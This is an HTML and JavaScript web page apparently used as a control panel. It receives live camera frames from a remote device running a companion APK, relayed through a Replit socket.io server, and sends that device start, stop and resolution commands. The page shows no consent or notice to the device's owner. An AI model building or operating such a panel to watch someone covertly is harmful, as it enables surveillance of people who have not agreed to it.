<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Live Camera Stream + Control</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            font-family: system-ui, -apple-system, sans-serif;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
        }
        
        .stream-box {
            background: rgba(0,0,0,0.5);
            border-radius: 24px;
            padding: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
            margin-bottom: 20px;
        }
        
        .controls {
            background: rgba(0,0,0,0.5);
            border-radius: 24px;
            padding: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        h1 {
            color: white;
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .video-container {
            background: #000;
            border-radius: 16px;
            overflow: hidden;
            aspect-ratio: 16/9;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        
        #streamImage {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px;
            background: rgba(255,255,255,0.1);
            border-radius: 12px;
            margin-bottom: 20px;
        }
        
        .status {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        .online { background: #4ade80; box-shadow: 0 0 8px #4ade80; }
        .offline { background: #f87171; }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        button {
            background: #6366f1;
            color: white;
            border: none;
            padding: 14px 28px;
            margin: 8px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        button:hover { transform: scale(1.02); }
        .stop-btn { background: #ef4444; }
        
        select {
            background: #1f2937;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 12px;
            margin: 8px;
            font-size: 14px;
        }
        
        .device-info {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 12px;
            margin-top: 15px;
            font-size: 12px;
            text-align: center;
            color: #94a3b8;
        }
        
        .button-group {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📹 Camera Control + Stream</h1>
        
        <div class="stream-box">
            <div class="status-bar">
                <div class="status">
                    <span class="status-dot offline" id="statusDot"></span>
                    <span class="info" id="statusText">Offline</span>
                </div>
                <div class="fps-counter" id="fpsCounter" style="background:rgba(0,0,0,0.7); padding:4px 12px; border-radius:20px;">FPS: 0</div>
            </div>
            
            <div class="video-container">
                <img id="streamImage" src="" alt="Camera Stream">
            </div>
            
            <div class="device-info" id="deviceInfo">
                No device connected
            </div>
        </div>
        
        <div class="controls">
            <div class="button-group">
                <button id="startBtn">▶ START STREAM</button>
                <button id="stopBtn" class="stop-btn">⏹ STOP STREAM</button>
            </div>
            <div class="button-group">
                <select id="resolutionSelect">
                    <option value="120p">120p (160x120) - 30fps</option>
                    <option value="240p" selected>240p (426x240) - 15fps</option>
                </select>
            </div>
        </div>
    </div>

    <script>
        // 🔴 TERA REPLIT LINK
        const SERVER_URL = "https://05fce22d-281f-419d-b4a7-6786f4296fda-00-3vqtfyjawc9vc.pike.replit.dev";
        
        let currentDeviceId = null;
        
        const socket = io(SERVER_URL, {
            transports: ['websocket', 'polling'],
            reconnection: true
        });
        
        const streamImage = document.getElementById('streamImage');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const fpsCounter = document.getElementById('fpsCounter');
        const deviceInfo = document.getElementById('deviceInfo');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const resolutionSelect = document.getElementById('resolutionSelect');
        
        let frameCount = 0;
        let lastFpsUpdate = Date.now();
        
        function updateFPS() {
            const now = Date.now();
            if (now - lastFpsUpdate >= 1000) {
                fpsCounter.textContent = `FPS: ${frameCount}`;
                frameCount = 0;
                lastFpsUpdate = now;
            }
            requestAnimationFrame(updateFPS);
        }
        updateFPS();
        
        // Get devices list
        socket.on('deviceList', (devices) => {
            if (devices && devices.length > 0) {
                currentDeviceId = devices[0].id;
                deviceInfo.innerHTML = `📱 Device: ${currentDeviceId.substring(0, 20)}... | Status: ${devices[0].status} | Resolution: ${devices[0].resolution}`;
            } else {
                deviceInfo.innerHTML = '⚠️ No device connected. Install APK first.';
                currentDeviceId = null;
            }
        });
        
        // Receive frame
        socket.on('streamFrame', (data) => {
            if (data && data.frame) {
                streamImage.src = data.frame;
                frameCount++;
                statusDot.className = 'status-dot online';
                statusText.textContent = 'Live';
                statusText.style.color = '#4ade80';
            }
        });
        
        socket.on('connect', () => {
            console.log('Connected');
            statusText.textContent = 'Connected';
        });
        
        socket.on('disconnect', () => {
            statusDot.className = 'status-dot offline';
            statusText.textContent = 'Offline';
            statusText.style.color = '#f87171';
        });
        
        // START button
        startBtn.onclick = () => {
            if (currentDeviceId) {
                socket.emit('command', { deviceId: currentDeviceId, command: 'start' });
                deviceInfo.innerHTML = `📱 Sending START to device...`;
            } else {
                deviceInfo.innerHTML = '⚠️ No device connected!';
            }
        };
        
        // STOP button
        stopBtn.onclick = () => {
            if (currentDeviceId) {
                socket.emit('command', { deviceId: currentDeviceId, command: 'stop' });
                deviceInfo.innerHTML = `📱 Sending STOP to device...`;
            }
        };
        
        // Resolution change
        resolutionSelect.onchange = () => {
            if (currentDeviceId) {
                const resolution = resolutionSelect.value;
                socket.emit('command', { deviceId: currentDeviceId, command: 'resolution', value: resolution });
                deviceInfo.innerHTML = `📱 Changing resolution to ${resolution}...`;
            }
        };
        
        // Request device list every 3 seconds
        setInterval(() => {
            socket.emit('getDevices');
        }, 3000);
    </script>
</body>
</html>
